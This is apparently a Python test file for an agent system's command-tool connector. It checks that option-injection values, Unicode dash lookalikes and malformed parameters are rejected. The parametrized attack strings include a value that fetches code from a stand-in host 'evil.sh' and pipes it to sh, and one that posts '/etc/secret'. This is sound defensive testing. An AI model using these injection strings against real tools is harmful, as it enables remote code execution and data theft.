# pyright: reportMissingImports=false, reportCallIssue=false, reportArgumentType=false
"""ADR-002 C.12 — the `command_tools` connector.

Mirrors `test_operator_connectors.py`'s framing: the happy path proves the
tool works, the escape attempts prove it is safe to have. Every attack
string here is taken verbatim from ADR-002 C.12's own attack table.
"""

from __future__ import annotations

import sys

import pytest

from agentsys.connectors.command_tools import build_command_tool_connector
from agentsys.harness.loader import CommandToolDeclaration, CommandToolParam, Tier


def _check_stock_declaration() -> CommandToolDeclaration:
    return CommandToolDeclaration(
        name="check_stock",
        argv=(sys.executable, "-c", "import sys; print(sys.argv[1])", "{sku}"),
        params={
            "sku": CommandToolParam(
                type="string", pattern=r"^[A-Za-z0-9_-]{1,32}$", max_length=32
            )
        },
        tier=Tier.T2,
        permission="run:check_stock",
    )


# ---------------------------------------------------------------------------
# Integration: the happy path actually runs the process
# ---------------------------------------------------------------------------
async def test_check_stock_shaped_tool_executes_with_a_valid_param() -> None:
    connector = build_command_tool_connector(_check_stock_declaration())

    result = await connector({"sku": "SKU123"})

    assert result["exit_code"] == 0
    assert result["stdout"].strip() == "SKU123"
    assert "error" not in result


# ---------------------------------------------------------------------------
# The four ADR-002 C.12 attack-shaped param values, verbatim
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "attack_value",
    [
        "-c core.sshCommand=curl${IFS}evil.sh|sh",
        "-exec rm",
        '-c "DROP TABLE users;"',
        "-d @/etc/secret",
    ],
)
async def test_leading_dash_param_values_are_rejected(attack_value: str) -> None:
    connector = build_command_tool_connector(_check_stock_declaration())

    result = await connector({"sku": attack_value})

    assert result.get("error_kind") == "option_injection_rejected"
    assert "stdout" not in result


# ---------------------------------------------------------------------------
# Call-time param validation
# ---------------------------------------------------------------------------
async def test_leading_dash_rejected_even_with_no_pattern_constraint() -> None:
    """The option-injection guard must stand on its own — not merely be
    subsumed by a `pattern`. A param with NO pattern at all still rejects a
    leading-dash value."""
    declaration = CommandToolDeclaration(
        name="free_text",
        argv=(sys.executable, "-c", "import sys; print(sys.argv[1])", "{note}"),
        params={"note": CommandToolParam(type="string")},
        tier=Tier.T2,
        permission="run:free_text",
    )
    connector = build_command_tool_connector(declaration)

    result = await connector({"note": "-c core.sshCommand=evil"})

    assert result.get("error_kind") == "option_injection_rejected"


# ---------------------------------------------------------------------------
# PR #147 review follow-up — Unicode dash lookalikes. A value starting with
# an en dash (U+2013), em dash (U+2014), or minus sign (U+2212) reads to a
# human and to many CLIs as "this is a flag", but `"-".startswith` alone
# never caught them — the reviewer read `/etc/hostname` this way.
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "dash_char,dash_name",
    [
        ("–", "en dash"),
        ("—", "em dash"),
        ("−", "minus sign"),
    ],
)
async def test_unicode_dash_lookalike_param_values_are_rejected(
    dash_char: str, dash_name: str
) -> None:
    declaration = CommandToolDeclaration(
        name="free_text",
        argv=(sys.executable, "-c", "import sys; print(sys.argv[1])", "{note}"),
        params={"note": CommandToolParam(type="string")},
        tier=Tier.T2,
        permission="run:free_text",
    )
    connector = build_command_tool_connector(declaration)

    result = await connector({"note": f"{dash_char}c evil"})

    assert result.get("error_kind") == "option_injection_rejected", dash_name


async def test_ascii_hyphen_still_rejected_alongside_unicode_lookalikes() -> None:
    """Regression: widening the guard to Unicode dashes must not narrow it —
    the plain ASCII hyphen-minus case from before must keep working."""
    declaration = CommandToolDeclaration(
        name="free_text",
        argv=(sys.executable, "-c", "import sys; print(sys.argv[1])", "{note}"),
        params={"note": CommandToolParam(type="string")},
        tier=Tier.T2,
        permission="run:free_text",
    )
    connector = build_command_tool_connector(declaration)

    result = await connector({"note": "-c evil"})

    assert result.get("error_kind") == "option_injection_rejected"


async def test_dash_not_at_start_of_value_is_not_rejected_by_the_guard() -> None:
    """The guard is about the LEADING character only — a hyphen elsewhere in
    an otherwise-valid value is not an option-injection shape."""
    declaration = CommandToolDeclaration(
        name="free_text",
        argv=(sys.executable, "-c", "import sys; print(sys.argv[1])", "{note}"),
        params={"note": CommandToolParam(type="string")},
        tier=Tier.T2,
        permission="run:free_text",
    )
    connector = build_command_tool_connector(declaration)

    result = await connector({"note": "SKU-123"})

    assert result.get("error_kind") != "option_injection_rejected"
    assert result["stdout"].strip() == "SKU-123"


async def test_unknown_param_is_rejected() -> None:
    connector = build_command_tool_connector(_check_stock_declaration())

    result = await connector({"sku": "SKU123", "extra": "nope"})

    assert result.get("error_kind") == "unknown_param"
    assert "stdout" not in result


async def test_missing_required_param_is_rejected() -> None:
    connector = build_command_tool_connector(_check_stock_declaration())

    result = await connector({})

    assert result.get("error_kind") == "missing_param"


async def test_param_exceeding_max_length_is_rejected() -> None:
    connector = build_command_tool_connector(_check_stock_declaration())

    result = await connector({"sku": "x" * 33})

    assert result.get("error_kind") == "invalid_param"


async def test_param_not_matching_pattern_is_rejected() -> None:
    connector = build_command_tool_connector(_check_stock_declaration())

    result = await connector({"sku": "not a valid sku!!"})

    assert result.get("error_kind") == "invalid_param"


async def test_param_must_match_declared_type() -> None:
    connector = build_command_tool_connector(_check_stock_declaration())

    result = await connector({"sku": 12345})

    assert result.get("error_kind") == "invalid_param"


async def test_enum_constrained_param_rejects_value_outside_enum() -> None:
    declaration = CommandToolDeclaration(
        name="set_status",
        argv=(sys.executable, "-c", "import sys; print(sys.argv[1])", "{status}"),
        params={"status": CommandToolParam(type="string", enum=("open", "closed"))},
        tier=Tier.T2,
        permission="run:set_status",
    )
    connector = build_command_tool_connector(declaration)

    result = await connector({"status": "deleted"})

    assert result.get("error_kind") == "invalid_param"


async def test_null_byte_in_param_is_rejected() -> None:
    connector = build_command_tool_connector(_check_stock_declaration())

    result = await connector({"sku": "a\x00b"})

    assert "error" in result
